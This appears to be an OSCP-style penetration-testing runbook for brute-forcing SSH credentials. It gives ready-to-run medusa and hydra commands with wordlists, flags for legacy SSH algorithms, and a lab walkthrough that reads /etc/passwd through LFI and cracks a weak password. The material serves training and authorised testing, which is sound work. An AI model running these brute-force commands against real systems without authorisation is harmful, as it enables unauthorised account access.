---
tags: [oscp, ssh, brute-force, runbook]
box_sources: [Payday]
---

# SSH — Brute Force

*You have a username (from LFI, SNMP, SMB, etc.) and need SSH access. Goal: find the password.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `medusa -h $BoxIP -u $Username -P $Wordlist -M ssh -t 4` | `[SUCCESS] ... Password: <pass>` | Always try medusa first for SSH — handles legacy algorithm negotiation better than hydra | `-t 4` limits threads. Old SSH servers (OpenSSH < 7) need lower concurrency or they drop connections. | SSH in with found creds | Increase patience — rockyou has 14M entries. If the password is early in the list, it hits within minutes. |
| `hydra -l $Username -P $Wordlist ssh://$BoxIP -t 4` | `[22][ssh] host: ... login: ... password: ...` | Modern SSH targets (OpenSSH 7+) | Hydra uses libssh which does NOT read `~/.ssh/config` — legacy algorithm issues can't be fixed with ssh_config. Use medusa for old boxes. | SSH in | Switch to medusa |

---

## Legacy SSH — Connection Flags

Old SSH servers (OpenSSH ≤ 5.x, Ubuntu 7.04–8.04 era) require negotiating deprecated algorithms that modern OpenSSH disables by default.

**Manual SSH connection to a legacy server:**
```bash
ssh -oHostKeyAlgorithms=ssh-rsa \
    -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 \
    -oMACs=+hmac-md5,hmac-sha1 \
    $Username@$BoxIP
```

**Add to `~/.ssh/config` to make it permanent for this target:**
```
Host <BoxIP>
    HostKeyAlgorithms ssh-rsa
    KexAlgorithms +diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
    MACs +hmac-md5,hmac-sha1
```

**Error → fix mapping:**

| Error | Meaning | Fix |
|-------|---------|-----|
| `no matching host key type found. Their offer: ssh-rsa,ssh-dss` | Modern client rejects legacy host key | Add `-oHostKeyAlgorithms=ssh-rsa` (drop `ssh-dss` — fully removed from newer OpenSSH) |
| `kex error: no match for method mac algo` | MAC mismatch | Add `-oMACs=+hmac-md5,hmac-sha1` |
| `no matching key exchange method found` | KEX mismatch | Add `-oKexAlgorithms=+diffie-hellman-group1-sha1` |
| `Bad key types '+ssh-rsa,ssh-dss'` | `ssh-dss` (DSA) removed from OpenSSH entirely | Remove `ssh-dss` from the list — use `ssh-rsa` alone |

> ⚠️ **Hydra with legacy SSH:** Hydra's libssh backend does NOT read `~/.ssh/config`. The `+` algorithm flags above only work for the OpenSSH binary (`/usr/bin/ssh`). For brute-forcing old SSH servers, use **medusa** instead.

---

## Payday Example (what caught the flag)

- `/etc/passwd` via LFI → found `patrick` (uid=1000)
- `medusa -h $BoxIP -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4`
- Hit at entry 109: `patrick:patrick`
- SSH required legacy flags (OpenSSH 4.6p1, Ubuntu 7.04):
  ```bash
  ssh -oHostKeyAlgorithms=ssh-rsa -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1 -oMACs=+hmac-md5,hmac-sha1 patrick@$BoxIP
  ```

---

**Module:** [[16. Password Attacks|Password Attacks]]
## External Resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [RevShells](https://www.revshells.com/) for reverse-shell selection
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for practical walkthrough searches
